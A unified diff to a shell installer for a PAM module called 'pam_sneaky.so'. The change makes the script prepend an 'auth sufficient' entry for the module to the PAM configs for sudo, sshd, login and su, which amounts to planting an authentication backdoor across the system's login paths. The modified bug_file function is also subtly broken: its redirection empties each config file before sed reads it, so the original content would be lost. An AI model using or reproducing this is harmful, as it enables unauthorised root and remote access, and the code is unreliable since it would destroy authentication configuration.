@@ -9,6 +9,13 @@ fi
 PAM_OBJECT="pam_sneaky.so"
 PAM_SOURCE="pam_sneaky.c"
 MODULE_DIR="/usr/lib/security/"
+PAM_CONFIG_DIR="/etc/pam.d/"
+PAM_BUG_FILES=(
+    "sudo"
+    "sshd"
+    "login"
+    "su"
+)
 
 
 # Build the program
@@ -50,13 +57,11 @@ cp ${PAM_OBJECT} ${MODULE_DIR}
 
 
 function bug_file(){
-    (echo "auth    sufficient    ${MODULE_DIR}${PAM_OBJECT}"; sed '/.*'${PAM_OBJECT}'.*/d' $1)
+    (echo "auth    sufficient    ${MODULE_DIR}${PAM_OBJECT}"; sed '/.*'${PAM_OBJECT}'.*/d' $1) > $1
 }
 
-bug_file /etc/pam.d/sudo
 
-# sshd
-# login
-# system-auth
-# sudo
-# su
+# Bug all the files to use pam_sneaky
+for PAM_FILE in ${PAM_BUG_FILES[@]}; do
+  bug_file ${PAM_CONFIG_DIR}${PAM_FILE}
+done
